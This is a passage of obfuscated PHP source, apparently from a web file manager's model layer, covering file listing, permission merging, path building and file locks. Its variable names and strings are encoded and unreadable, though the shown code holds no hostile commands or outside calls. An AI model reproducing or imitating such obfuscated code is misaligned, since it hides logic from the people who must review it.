Model($Á—ËÂşæ[512])->fileMd5Check($âå„Î¯); } if (!isset(self::$cacheFileInfo[$Á—ËÂşæ[516] . $ãØÒëòô])) { self::$cacheFileInfo[$Á—ËÂşæ[516] . $ãØÒëòô] = array_merge(array(), $âå„Î¯); } unset($Ğ‡÷Ÿ[$ãØÒëòô][$Á—ËÂşæ[84]]); $şò®ïíİ = is_array($©¤áéÀû[$ãØÒëòô]) ? $©¤áéÀû[$ãØÒëòô] : array(); $Â‹Ç¯¾[$Á—ËÂşæ[517]] = array_merge($şò®ïíİ, $Ğ‡÷Ÿ[$ãØÒëòô]); if (isset($Â‹Ç¯¾[$Á—ËÂşæ[517]][$Á—ËÂşæ[171]])) { $Â‹Ç¯¾[$Á—ËÂşæ[171]] = json_decode($Â‹Ç¯¾[$Á—ËÂşæ[517]][$Á—ËÂşæ[171]], !0); unset($Â‹Ç¯¾[$Á—ËÂşæ[517]][$Á—ËÂşæ[171]]); } } unset($Â‹Ç¯¾); } protected function _listAppendSourceInfo(&$ÙÀ£¢åŸ, $ó·Û‰×÷) { $âıòÎå¢ =& $_SERVER[³½¬ÚË¯]; $¤ë¨»¤’ = Model($âıòÎå¢[518])->listData(); $ê¶‚„Î‚ = Model($âıòÎå¢[467])->listData(); $¥¯Ü–¯ = Model($âıòÎå¢[457])->listData(); $œõï–‡£ = Model($âıòÎå¢[519])->listSimple(); $ÈÀé²ë = array_to_keyvalue($¤ë¨»¤’, $âıòÎå¢[443]); $½ï¾¸íÂ = array_to_keyvalue_group($ê¶‚„Î‚, $âıòÎå¢[84], $âıòÎå¢[468]); $¯ÂÓ…˜Ş = array_to_keyvalue($¥¯Ü–¯, $âıòÎå¢[84]); $ğğ¾îÏÙ = array_to_keyvalue_group($œõï–‡£, $âıòÎå¢[181]); foreach ($ÙÀ£¢åŸ as &$µ¢í‘“) { $µ¢í‘“[$âıòÎå¢[87]] = array($âıòÎå¢[520] => 0, $âıòÎå¢[521] => 0, $âıòÎå¢[522] => 0); if (isset($¯ÂÓ…˜Ş[$µ¢í‘“[$âıòÎå¢[181]]])) { $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[523]] = 1; $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[524]] = $¯ÂÓ…˜Ş[$µ¢í‘“[$âıòÎå¢[181]]][$âıòÎå¢[32]]; } if ($½ï¾¸íÂ && $ÈÀé²ë && isset($½ï¾¸íÂ[$µ¢í‘“[$âıòÎå¢[181]]])) { $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[525]] = array(); foreach ($½ï¾¸íÂ[$µ¢í‘“[$âıòÎå¢[181]]] as $‰™ùÈáî) { $¿¿åÂäÀ = $ÈÀé²ë[$‰™ùÈáî]; $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[525]][] = array($âıòÎå¢[526] => $¿¿åÂäÀ[$âıòÎå¢[443]], $âıòÎå¢[462] => $¿¿åÂäÀ[$âıòÎå¢[32]], $âıòÎå¢[527] => $¿¿åÂäÀ[$âıòÎå¢[528]]); } } if ($ğğ¾îÏÙ && isset($ğğ¾îÏÙ[$µ¢í‘“[$âıòÎå¢[181]]])) { $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[529]] = array(); foreach ($ğğ¾îÏÙ[$µ¢í‘“[$âıòÎå¢[181]]] as $Ÿ¾ûÓ¥) { $éÛñú = $âıòÎå¢[530]; if ($Ÿ¾ûÓ¥[$âıòÎå¢[531]] == $âıòÎå¢[88]) { $éÛñú .= $âıòÎå¢[532]; } $µ¢í‘“[$âıòÎå¢[87]][$âıòÎå¢[529]] = array_field_key($Ÿ¾ûÓ¥, explode($âıòÎå¢[50], $éÛñú)); } } } unset($µ¢í‘“); return $ÙÀ£¢åŸ; } protected function _listAppendChildren(&$íŸñÔòô, $§¿‰¿€É) { $ê‡ãêá˜ =& $_SERVER[³½¬ÚË¯]; $ĞÓ¬«Ÿô = array(); $üúéøÜõ = array($ê‡ãêá˜[223] => 0, $ê‡ãêá˜[224] => 0); foreach ($íŸñÔòô as &$Ê° Ô¾×) { if (!$Ê° Ô¾×[$ê‡ãêá˜[453]]) { continue; } $ĞÓ¬«Ÿô[] = $Ê° Ô¾×[$ê‡ãêá˜[181]]; } unset($Ê° Ô¾×); if (!$ĞÓ¬«Ÿô) { return; } $àà©•–° = array($ê‡ãêá˜[180] => array($ê‡ãêá˜[7], $ĞÓ¬«Ÿô), $ê‡ãêá˜[473] => 0); $¼àÏî°Â = array($ê‡ãêá˜[180], $ê‡ãêá˜[453], $ê‡ãêá˜[533] => $ê‡ãêá˜[534]); $Ã©È˜ş¸ = $this->field($¼àÏî°Â)->where($àà©•–°)->group($ê‡ãêá˜[535])->select(); $æ¹Ô„¡’ = array(); foreach ($Ã©È˜ş¸ as $Œé¦èšö) { $°ôöôş = $Œé¦èšö[$ê‡ãêá˜[180]]; $“ğø¯§ß = $Œé¦èšö[$ê‡ãêá˜[453]] == $ê‡ãêá˜[88] ? $ê‡ãêá˜[224] : $ê‡ãêá˜[223]; if (!isset($æ¹Ô„¡’[$°ôöôş])) { $æ¹Ô„¡’[$°ôöôş] = array($ê‡ãêá˜[223] => 0, $ê‡ãêá˜[224] => 0); } $æ¹Ô„¡’[$°ôöôş][$“ğø¯§ß] += $Œé¦èšö[$ê‡ãêá˜[534]]; } foreach ($íŸñÔòô as &$Ê° Ô¾×) { if (!$Ê° Ô¾×[$ê‡ãêá˜[453]]) { continue; } $ç™šüä„ = is_array($æ¹Ô„¡’[$Ê° Ô¾×[$ê‡ãêá˜[181]]]) ? $æ¹Ô„¡’[$Ê° Ô¾×[$ê‡ãêá˜[181]]] : $üúéøÜõ; $Ê° Ô¾×[$ê‡ãêá˜[224]] = $ç™šüä„[$ê‡ãêá˜[224]]; $Ê° Ô¾×[$ê‡ãêá˜[223]] = $ç™šüä„[$ê‡ãêá˜[223]]; unset($Ê° Ô¾×[$ê‡ãêá˜[454]]); } unset($Ê° Ô¾×); } protected function _listAppendAuth(&$ıìÜšÁ¡) { $ù‰ŒêÒ½ =& $_SERVER[³½¬ÚË¯]; $§œ¨ Ì€ = array(); foreach ($ıìÜšÁ¡ as $³»ùÀİá) { if ($³»ùÀİá[$ù‰ŒêÒ½[178]] == self::TYPE_GROUP) { $§œ¨ Ì€[] = $³»ùÀİá[$ù‰ŒêÒ½[181]]; } } if (!$§œ¨ Ì€) { return; } $ˆÌ†ÒÙª = array_to_keyvalue($ıìÜšÁ¡, $ù‰ŒêÒ½[181]); $Ù¬äÇÆ” = Model($ù‰ŒêÒ½[536])->getSourceList($§œ¨ Ì€, $ˆÌ†ÒÙª); $¯€êÏ¯Ü = $GLOBALS[$ù‰ŒêÒ½[537]] == 1; foreach ($ıìÜšÁ¡ as $¿ê§Çäö => &$³»ùÀİá) { $³»ùÀİá[$ù‰ŒêÒ½[455]] = $Ù¬äÇÆ”[$³»ùÀİá[$ù‰ŒêÒ½[181]]]; if (!$³»ùÀİá[$ù‰ŒêÒ½[455]] && $³»ùÀİá[$ù‰ŒêÒ½[178]] == self::TYPE_GROUP) { $³»ùÀİá[$ù‰ŒêÒ½[455]] = Action($ù‰ŒêÒ½[538])->pathGroupAuthMake($³»ùÀİá[$ù‰ŒêÒ½[539]]); if (!$³»ùÀİá[$ù‰ŒêÒ½[455]] && !$¯€êÏ¯Ü) { $³»ùÀİá[$ù‰ŒêÒ½[217]] = !1; $³»ùÀİá[$ù‰ŒêÒ½[216]] = !1; } } if ($³»ùÀİá[$ù‰ŒêÒ½[455]]) { $³»ùÀİá[$ù‰ŒêÒ½[217]] = AuthModel::authCheckEdit($³»ùÀİá[$ù‰ŒêÒ½[455]][$ù‰ŒêÒ½[456]]); $³»ùÀİá[$ù‰ŒêÒ½[216]] = AuthModel::authCheckView($³»ùÀİá[$ù‰ŒêÒ½[455]][$ù‰ŒêÒ½[456]]); } $this->groupPathDisplay($³»ùÀİá); } unset($³»ùÀİá); } public function _listAppendAuthSecret(&$ÙÙş·„Ş) { $Ü–‘”‰» =& $_SERVER[³½¬ÚË¯]; if (Model($Ü–‘”‰»[476])->get($Ü–‘”‰»[540]) != $Ü–‘”‰»[88]) { return; } static $¦å¯½»ê = false; if (!$¦å¯½»ê) { $úı¨ÚÉ = Model($Ü–‘”‰»[541]); $ÑÜÈŞÔ = Model($Ü–‘”‰»[542]); $¦å¯½»ê = $ÑÜÈŞÔ->listData(); $¦å¯½»ê = array_to_keyvalue($¦å¯½»ê, $Ü–‘”‰»[181]); $ËØ†°‰¬ = json_decode(Model($Ü–‘”‰»[476])->get($Ü–‘”‰»[543]), !0); $ËØ†°‰¬ = array_to_keyvalue($ËØ†°‰¬, $Ü–‘”‰»[443]); foreach ($¦å¯½»ê as $ÊÍçƒàî => $³˜•«ã) { $ËÏ¦ªÕ‰ = $ËØ†°‰¬[$³˜•«ã[$Ü–‘”‰»[544]]]; if (!$ËÏ¦ªÕ‰) { $ÑÜÈŞÔ->remove($³˜•«ã[$Ü–‘”‰»[443]]); unset($¦å¯½»ê[$ÊÍçƒàî]); continue; } $Ì¸åÈ = $úı¨ÚÉ->listData($ËÏ¦ªÕ‰[$Ü–‘”‰»[455]]); if (!$Ì¸åÈ) { $ÑÜÈŞÔ->remove($³˜•«ã[$Ü–‘”‰»[443]]); unset($¦å¯½»ê[$ÊÍçƒàî]); continue; } $³˜•«ã[$Ü–‘”‰»[455]] = $Ì¸åÈ; $³˜•«ã[$Ü–‘”‰»[545]] = $ËÏ¦ªÕ‰; $³˜•«ã[$Ü–‘”‰»[546]] = Model($Ü–‘”‰»[547])->getInfoSimpleOuter($³˜•«ã[$Ü–‘”‰»[495]]); $¦å¯½»ê[$ÊÍçƒàî] = $³˜•«ã; } } $ØÍß¼¦ = USER_ID; $­÷ƒ¸ÖØ = array(); $¸¥¿Ü°• = $this->_listAppendPath($­÷ƒ¸ÖØ, !0); foreach ($ÙÙş·„Ş as $ÊÍçƒàî => &$³˜•«ã) { if (!is_array($³˜•«ã[$Ü–‘”‰»[455]])) { continue; } if ($³˜•«ã[$Ü–‘”‰»[178]] != $Ü–‘”‰»[548]) { continue; } if (isset($¦å¯½»ê[$³˜•«ã[$Ü–‘”‰»[181]]])) { $äÏÎÜÓ† = $¦å¯½»ê[$³˜•«ã[$Ü–‘”‰»[181]]]; if (!is_array($³˜•«ã[$Ü–‘”‰»[507]])) { $³˜•«ã[$Ü–‘”‰»[507]] = array(); } $³˜•«ã[$Ü–‘”‰»[507]][$Ü–‘”‰»[549]] = $äÏÎÜÓ†[$Ü–‘”‰»[544]]; $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[550]] = $äÏÎÜÓ†; $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[551]] = $³˜•«ã[$Ü–‘”‰»[552]]; $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[553]] = $Ü–‘”‰»[88]; if ($äÏÎÜÓ†[$Ü–‘”‰»[495]] != $ØÍß¼¦) { $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[456]] = $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[456]] & $äÏÎÜÓ†[$Ü–‘”‰»[455]][$Ü–‘”‰»[455]]; } continue; } $ñÕ¢Ïéß = $this->parentLevelArray($³˜•«ã[$Ü–‘”‰»[554]]); $øâïæÈ‡ = array_reverse($ñÕ¢Ïéß); foreach ($øâïæÈ‡ as $®àé¯ => $“û÷Ã£ô) { if (!isset($¦å¯½»ê[$“û÷Ã£ô])) { continue; } $äÏÎÜÓ† = $¦å¯½»ê[$“û÷Ã£ô]; $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[550]] = $äÏÎÜÓ†; if ($äÏÎÜÓ†[$Ü–‘”‰»[495]] != $ØÍß¼¦) { $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[456]] = $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[456]] & $äÏÎÜÓ†[$Ü–‘”‰»[455]][$Ü–‘”‰»[455]]; } $£Şî¶ÏÒ = $Ü–‘”‰»[12]; $¡µŞÄ‰ù = count($ñÕ¢Ïéß) - $®àé¯; for ($¬…ãùÜ• = 0; $¬…ãùÜ• < $¡µŞÄ‰ù; $¬…ãùÜ•++) { if (!isset($¸¥¿Ü°•[$ñÕ¢Ïéß[$¬…ãùÜ•]])) { $£Şî¶ÏÒ = $Ü–‘”‰»[12]; break; } $£Şî¶ÏÒ = $£Şî¶ÏÒ . rtrim($¸¥¿Ü°•[$ñÕ¢Ïéß[$¬…ãùÜ•]], $Ü–‘”‰»[8]) . $Ü–‘”‰»[8]; } $³˜•«ã[$Ü–‘”‰»[455]][$Ü–‘”‰»[551]] = rtrim($£Şî¶ÏÒ, $Ü–‘”‰»[8]) . $Ü–‘”‰»[8]; break; } } unset($³˜•«ã); } public function groupPathDisplay(&$·¶ÀÕàå) { $àüœŒÔé =& $_SERVER[³½¬ÚË¯]; if ($·¶ÀÕàå[$àüœŒÔé[178]] != self::TYPE_GROUP) { return; } $À¨ ğ‹â = Model($àüœŒÔé[555])->getInfo($·¶ÀÕàå[$àüœŒÔé[539]]); $ÑâŸŸš = $this->parentLevelArray($À¨ ğ‹â[$àüœŒÔé[554]]); $Ö‚²ª‹ = $àüœŒÔé[12]; foreach ($ÑâŸŸš as $“ÅËºŒÆ) { $İü¯óó÷ = Model($àüœŒÔé[555])->getInfo($“ÅËºŒÆ); $Ö‚²ª‹ .= $İü¯óó÷[$àüœŒÔé[87]][$àüœŒÔé[181]] . $àüœŒÔé[50]; } $·¶ÀÕàå[$àüœŒÔé[556]] = $À¨ ğ‹â[$àüœŒÔé[180]]; $·¶ÀÕàå[$àüœŒÔé[557]] = $À¨ ğ‹â[$àüœŒÔé[554]]; $·¶ÀÕàå[$àüœŒÔé[558]] = $À¨ ğ‹â[$àüœŒÔé[559]]; $·¶ÀÕàå[$àüœŒÔé[560]] = $Ö‚²ª‹ . $À¨ ğ‹â[$àüœŒÔé[87]][$àüœŒÔé[181]]; } protected function _listAppendPath(&$ÁÉğ…¤ğ, $¿º£¡üâ = false) { $—®†” =& $_SERVER[³½¬ÚË¯]; static $‚øêìšÑ = array(); $ĞúÀÇ¡É = array(); $›×ƒØó = array(); if ($¿º£¡üâ) { return $‚øêìšÑ; } foreach ($ÁÉğ…¤ğ as &$µÕØŒ¾×) { $»Šë­› = $µÕØŒ¾×[$—®†”[181]]; if ($µÕØŒ¾×[$—®†”[453]] == $—®†”[88] && $µÕØŒ¾×[$—®†”[180]] != 0) { $‚øêìšÑ[$»Šë­›] = $µÕØŒ¾×[$—®†”[32]]; } if ($µÕØŒ¾×[$—®†”[453]] == $—®†”[88] && $µÕØŒ¾×[$—®†”[180]] == 0) { $‚øêìšÑ[$»Šë­›] = $this->_listAppendPathRoot($µÕØŒ¾×, array()); } if (isset($›×ƒØó[$µÕØŒ¾×[$—®†”[554]]])) { continue; } $›×ƒØó[$µÕØŒ¾×[$—®†”[554]]] = !0; $ÊöĞø³ = $this->parentLevelArray($µÕØŒ¾×[$—®†”[554]]); foreach ($ÊöĞø³ as $È‹¬“Ç‘ => $Ûà¾íÉø) { if (isset($‚øêìšÑ[$Ûà¾íÉø])) { continue; } if ($È‹¬“Ç‘ == 0) { $‚øêìšÑ[$Ûà¾íÉø] = $this->_listAppendPathRoot($µÕØŒ¾×, $ÊöĞø³); } if ($È‹¬“Ç‘ != 0) { $ĞúÀÇ¡É[] = $Ûà¾íÉø; } } } unset($µÕØŒ¾×); $ĞúÀÇ¡É = array_unique($ĞúÀÇ¡É); if (count($ĞúÀÇ¡É) > 0) { $Í¡‡î»ñ = array($—®†”[459] => array($—®†”[460], $ĞúÀÇ¡É)); if (count($ĞúÀÇ¡É) == 1) { $¤¨œ‚ = $this->sourceInfo($ĞúÀÇ¡É[0]); $àĞĞ£È = is_array($¤¨œ‚) ? array($¤¨œ‚) : !1; } else { $àĞĞ£È = $this->field($—®†”[561])->where($Í¡‡î»ñ)->select(); } if (!$àĞĞ£È) { $àĞĞ£È = array(); } foreach ($àĞĞ£È as $Ç«íï°É) { $‚øêìšÑ[$Ç«íï°É[$—®†”[181]]] = $Ç«íï°É[$—®†”[32]]; } } $›½öø‰ç = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ú¤€å¬ó = array(); foreach ($ÁÉğ…¤ğ as &$µÕØŒ¾×) { $×‡°«¥ = $µÕØŒ¾×[$—®†”[554]]; $ÆøâÊºè = $—®†”[12]; if (isset($ú¤€å¬ó[$×‡°«¥])) { $ÆøâÊºè = $ú¤€å¬ó[$×‡°«¥]; } else { $ÊöĞø³ = $this->parentLevelArray($µÕØŒ¾×[$—®†”[554]]); foreach ($ÊöĞø³ as $È‹¬“Ç‘ => $Ûà¾íÉø) { if (isset($‚øêìšÑ[$Ûà¾íÉø])) { $ÆøâÊºè .= $‚øêìšÑ[$Ûà¾íÉø] . $—®†”[8]; } } $ú¤€å¬ó[$×‡°«¥] = $ÆøâÊºè; } $ÆøâÊºè .= $µÕØŒ¾×[$—®†”[32]]; if ($µÕØŒ¾×[$—®†”[453]] == $—®†”[88]) { $ÆøâÊºè .= $—®†”[8]; } $µÕØŒ¾×[$—®†”[552]] = str_replace($—®†”[562], $—®†”[8], $ÆøâÊºè); if ($µÕØŒ¾×[$—®†”[180]] == $—®†”[212]) { $µÕØŒ¾×[$—®†”[32]] = trim($‚øêìšÑ[$µÕØŒ¾×[$—®†”[181]]], $—®†”[8]); $µÕØŒ¾×[$—®†”[552]] = $µÕØŒ¾×[$—®†”[32]] . $—®†”[8]; } if (intval($µÕØŒ¾×[$—®†”[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($µÕØŒ¾×, $ÊöĞø³, $›½öø‰ç); } } unset($µÕØŒ¾×); return $ÁÉğ…¤ğ; } private function _listAppendPathRecycle(&$€…îê, $¡ú†»íù, $ŠÂµÎ¶š) { $ÚˆÃªØ =& $_SERVER[³½¬ÚË¯]; if (!in_array($ŠÂµÎ¶š, $¡ú†»íù) && $€…îê[$ÚˆÃªØ[181]] != $ŠÂµÎ¶š) { return; } $—Èã„ƒ˜ = explode($ÚˆÃªØ[8], trim($€…îê[$ÚˆÃªØ[552]], $ÚˆÃªØ[8])); $ôîÌ·óÔ = implode($ÚˆÃªØ[8], array_slice($—Èã„ƒ˜, 2)); $€…îê[$ÚˆÃªØ[552]] = $ÚˆÃªØ[8] . LNG($ÚˆÃªØ[563]) . $ÚˆÃªØ[8] . ltrim($ôîÌ·óÔ, $ÚˆÃªØ[8]); $€…îê[$ÚˆÃªØ[554]] = $ÚˆÃªØ[564] . implode($ÚˆÃªØ[50], array_slice($¡ú†»íù, 1)) . $ÚˆÃªØ[50]; if ($€…îê[$ÚˆÃªØ[181]] == $ŠÂµÎ¶š) { $€…îê[$ÚˆÃªØ[554]] = $ÚˆÃªØ[564]; $€…îê[$ÚˆÃªØ[180]] = $ÚˆÃªØ[212]; $€…îê[$ÚˆÃªØ[32]] = LNG($ÚˆÃªØ[563]); } $€…îê[$ÚˆÃªØ[565]] = $ÚˆÃªØ[566]; } protected function _listAppendPathRoot(&$»â¥ä², $”İâÑŒ) { $½¡æöèÜ =& $_SERVER[³½¬ÚË¯]; static $×ÏïàŒó = false; $¿×²¸ù = $½¡æöèÜ[12]; if ($»â¥ä²[$½¡æöèÜ[178]] == self::TYPE_USER) { if ($»â¥ä²[$½¡æöèÜ[539]] == USER_ID) { $¿×²¸ù = LNG($½¡æöèÜ[567]); if ($×ÏïàŒó === !1) { $²ûùæ‰¥ = Model($½¡æöèÜ[568])->getInfoFull(USER_ID); $×ÏïàŒó = _get($²ûùæ‰¥, $½¡æöèÜ[569], $½¡æöèÜ[12]); } if ($”İâÑŒ && $”İâÑŒ[0] == $×ÏïàŒó || !$”İâÑŒ && $»â¥ä²[$½¡æöèÜ[181]] == $×ÏïàŒó) { $¿×²¸ù = LNG($½¡æöèÜ[570]); $»â¥ä²[$½¡æöèÜ[571]] = $½¡æöèÜ[572]; } if (!$”İâÑŒ) { $»â¥ä²[$½¡æöèÜ[32]] = $¿×²¸ù; } } else { $»â¥ä²[$½¡æöèÜ[573]] = Model($½¡æöèÜ[547])->getInfoSimpleOuter($»â¥ä²[$½¡æöèÜ[539]]); $¿×²¸ù = LNG($½¡æöèÜ[574]) . $½¡æöèÜ[163] . $»â¥ä²[$½¡æöèÜ[573]][$½¡æöèÜ[32]] . $½¡æöèÜ[165]; } } else { if ($»â¥ä²[$½¡æöèÜ[178]] == self::TYPE_GROUP) { $ùÎÑ¤æ… = Model($½¡æöèÜ[555])->getInfoSimple($»â¥ä²[$½¡æöèÜ[539]]); $¿×²¸ù = $ùÎÑ¤æ…[$½¡æöèÜ[32]]; } else { if ($»â¥ä²[$½¡æöèÜ[178]] == self::TYPE_SYSTEM) { $¿×²¸ù = $½¡æöèÜ[575]; } } } $¿×²¸ù = $¿×²¸ù ? $½¡æöèÜ[8] . $¿×²¸ù . $½¡æöèÜ[8] : $½¡æöèÜ[8]; return $¿×²¸ù; } protected function _listAppendUser(&$‰­Ş•äê) { $ˆ¶éñÍ =& $_SERVER[³½¬ÚË¯]; $ ‘ÏçÑÓ = array_to_keyvalue($‰­Ş•äê, $ˆ¶éñÍ[12], $ˆ¶éñÍ[495]); $´Áà = array_to_keyvalue($‰­Ş•äê, $ˆ¶éñÍ[12], $ˆ¶éñÍ[497]); $Ë”ÊÔ£î = array_merge($ ‘ÏçÑÓ, $´Áà); $©”•İÙ€ = Model($ˆ¶éñÍ[568])->userListInfo($Ë”ÊÔ£î); foreach ($‰­Ş•äê as &$É€æ±«ô) { $ÈƒÍ£ÛŠ = $É€æ±«ô[$ˆ¶éñÍ[495]]; $É€æ±«ô[$ˆ¶éñÍ[495]] = $©”•İÙ€[$ÈƒÍ£ÛŠ] ? $©”•İÙ€[$ÈƒÍ£ÛŠ] : !1; $ÈƒÍ£ÛŠ = $É€æ±«ô[$ˆ¶éñÍ[497]]; $É€æ±«ô[$ˆ¶éñÍ[497]] = $©”•İÙ€[$ÈƒÍ£ÛŠ] ? $©”•İÙ€[$ÈƒÍ£ÛŠ] : !1; if (isset($É€æ±«ô[$ˆ¶éñÍ[507]]) && $É€æ±«ô[$ˆ¶éñÍ[507]][$ˆ¶éñÍ[576]]) { $åÇæÓ¦ê = $GLOBALS[$ˆ¶éñÍ[6]][$ˆ¶éñÍ[89]][$ˆ¶éñÍ[577]]; if ($É€æ±«ô[$ˆ¶éñÍ[507]][$ˆ¶éñÍ[578]] <= time() - $åÇæÓ¦ê) { $this->metaSet($É€æ±«ô[$ˆ¶éñÍ[181]], $ˆ¶éñÍ[576], null); $this->metaSet($É€æ±«ô[$ˆ¶éñÍ[181]], $ˆ¶éñÍ[578], null); unset($É€æ±«ô[$ˆ¶éñÍ[507]][$ˆ¶éñÍ[576]]); continue; } $Û©ÁêˆŞ = $É€æ±«ô[$ˆ¶éñÍ[507]][$ˆ¶éñÍ[576]]; $É€æ±«ô[$ˆ¶éñÍ[507]][$ˆ¶éñÍ[579]] = Model($ˆ¶éñÍ[568])->getInfoSimpleOuter($Û©ÁêˆŞ); } } unset($É€æ±«ô); } public function parentLevelArray($³“©¹³ ) { $™ªàª“‘ =& $_SERVER[³½¬ÚË¯]; $³“©¹³  = explode($™ªàª“‘[50], trim($³“©¹³ , $™ªàª“‘[50])); return array_remove_value($³“©¹³ , $™ªàª“‘[212]); } public function listAll($ÄºŒß Å) { $ˆÈ°”¾Ë =& $_SERVER[³½¬ÚË¯]; $±˜ŞÏü¨ = $this->sourceInfo($ÄºŒß Å); $ÉãÏ¡õ„ = array($ˆÈ°”¾Ë[580] => array($ˆÈ°”¾Ë[581], $±˜ŞÏü¨[$ˆÈ°”¾Ë[554]] . $ÄºŒß Å . $ˆÈ°”¾Ë[582]), $ˆÈ°”¾Ë[583] => 0); $½’­ÕÆ‹ = $ˆÈ°”¾Ë[584]; $³˜“¯¡± = "\114\x45\x46\x54\40\x4a\117\111\116\40{$this->tablePrefix}\151\x6f\137\146\151\x6c\145\40\x66\x69\x6c\145\x20\157\156\40\x73\157\165\x72\143\145\x2e\146\151\154\x65\111\104\x20\75\x20\146\151\x6c\145\56\x66\x69\154\145\111\x44"; $÷ó»²şÔ = $this->alias($ˆÈ°”¾Ë[487])->field($½’­ÕÆ‹)->where($ÉãÏ¡õ„)->join($³˜“¯¡±)->select(); $this->_listAppendAuth($÷ó»²şÔ); $this->_listAppendUser($÷ó»²şÔ); $this->_listAppendPath($÷ó»²şÔ); $÷ó»²şÔ = array_to_keyvalue($÷ó»²şÔ, $ˆÈ°”¾Ë[181]); $íèùšÉ = "\57{$±˜ŞÏü¨[$ˆÈ°”¾Ë[32]]}\x2f"; $íèùšÉ = $íèùšÉ == $ˆÈ°”¾Ë[562] ? $ˆÈ°”¾Ë[8] : $íèùšÉ; $æÙàâä = array(); foreach ($÷ó»²şÔ as $æÁÉ‚ƒœ => $æ¨áƒİ) { $‹ÒÖˆ = $this->parentLevelArray($æ¨áƒİ[$ˆÈ°”¾Ë[554]]); array_shift($‹ÒÖˆ); $‹¦ş¿á” = $íèùšÉ; for ($Óêİû‰’ = 0; $Óêİû‰’ < count($‹ÒÖˆ); $Óêİû‰’++) { $‹¦ş¿á” .= $÷ó»²şÔ[$‹ÒÖˆ[$Óêİû‰’]][$ˆÈ°”¾Ë[32]] . $ˆÈ°”¾Ë[8]; } $‹¦ş¿á” .= $æ¨áƒİ[$ˆÈ°”¾Ë[32]]; if ($æ¨áƒİ[$ˆÈ°”¾Ë[453]]) { $‹¦ş¿á” .= $ˆÈ°”¾Ë[8]; } $şğáÂ¬ = array($ˆÈ°”¾Ë[463] => str_replace($ˆÈ°”¾Ë[562], $ˆÈ°”¾Ë[8], str_replace($ˆÈ°”¾Ë[562], $ˆÈ°”¾Ë[8], str_replace($ˆÈ°”¾Ë[562], $ˆÈ°”¾Ë[8], $‹¦ş¿á”))), $ˆÈ°”¾Ë[585] => intval($æ¨áƒİ[$ˆÈ°”¾Ë[453]]), $ˆÈ°”¾Ë[586] => intval($æ¨áƒİ[$ˆÈ°”¾Ë[76]]), $ˆÈ°”¾Ë[85] => intval($æ¨áƒİ[$ˆÈ°”¾Ë[85]]), $ˆÈ°”¾Ë[87] => $this->pathInfoFilter($æ¨áƒİ)); if (!$şğáÂ¬[$ˆÈ°”¾Ë[453]]) { $şğáÂ¬[$ˆÈ°”¾Ë[509]] = $æ¨áƒİ[$ˆÈ°”¾Ë[509]]; } $æÙàâä[] = $şğáÂ¬; } $æÙàâä = array_sort_by($æÙàâä, $ˆÈ°”¾Ë[84]); return $æÙàâä; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Öè‚£ÃÁ) { $öÚÁ´ê® =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($öÚÁ´ê®[587], $Öè‚£ÃÁ); $‘ĞÖ = 1; $this->_lockEvent($Öè‚£ÃÁ, array($öÚÁ´ê®[588], $öÚÁ´ê®[589]), $‘ĞÖ); $this->_lockParent($Öè‚£ÃÁ, array($öÚÁ´ê®[589]), $‘ĞÖ); $this->_lockEvent($Öè‚£ÃÁ, array($öÚÁ´ê®[590], $öÚÁ´ê®[591]), $‘ĞÖ); $this->_lockCheckEnd($öÚÁ´ê®[587], $Öè‚£ÃÁ); } public function lockCopyEnd($‡åÔÕÊû) { $¦Í²ÒÆÊ =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $èƒÜ†ğ = 0; $this->_lockEvent($‡åÔÕÊû, array($¦Í²ÒÆÊ[588], $¦Í²ÒÆÊ[589]), $èƒÜ†ğ); $this->_lockParent($‡åÔÕÊû, array($¦Í²ÒÆÊ[589]), $èƒÜ†ğ); $this->_lockEvent($‡åÔÕÊû, array($¦Í²ÒÆÊ[590], $¦Í²ÒÆÊ[591]), $èƒÜ†ğ); } public function lockWriteStart($¡Ÿæ•–Ş, $°…¥ƒ = '') { $ÃŒ§ş«Ò =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÃŒ§ş«Ò[588], $¡Ÿæ•–Ş); $İŞ›ë¹” = 1; $this->_lockKey($ÃŒ§ş«Ò[592] . $¡Ÿæ•–Ş . $ÃŒ§ş«Ò[10] . $°…¥ƒ, $İŞ›ë¹”); $this->_lockEvent($¡Ÿæ•–Ş, array($ÃŒ§ş«Ò[587], $ÃŒ§ş«Ò[589]), $İŞ›ë¹”); $this->_lockParent($¡Ÿæ•–Ş, array($ÃŒ§ş«Ò[587], $ÃŒ§ş«Ò[589]), $İŞ›ë¹”); $this->_lockCheckEnd($ÃŒ§ş«Ò[588], $¡Ÿæ•–Ş); } public function lockWriteEnd($şÎ¿Â•í, $òêÎ¯ªŠ = '') { $´¸ğÔè =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $äœâÜÈ¼ = 0; $this->_lockKey($´¸ğÔè[592] . $şÎ¿Â•í . $´¸ğÔè[10] . $òêÎ¯ªŠ, $äœâÜÈ¼); $this->_lockEvent($şÎ¿Â•í, array($´¸ğÔè[587], $´¸ğÔè[589]), $äœâÜÈ¼); $this->_lockParent($şÎ¿Â•í, array($´¸ğÔè[587], $´¸ğÔè[589]), $äœâÜÈ¼); } public function lockMoveStart($¿úÁıœ) { $£¦òÃş =& $_SERVER[³½¬ÚË¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($£¦òÃş[589], $¿úÁıœ); $áøıïÏ£ = 1; $this->_lockKey($£¦òÃş[593] . 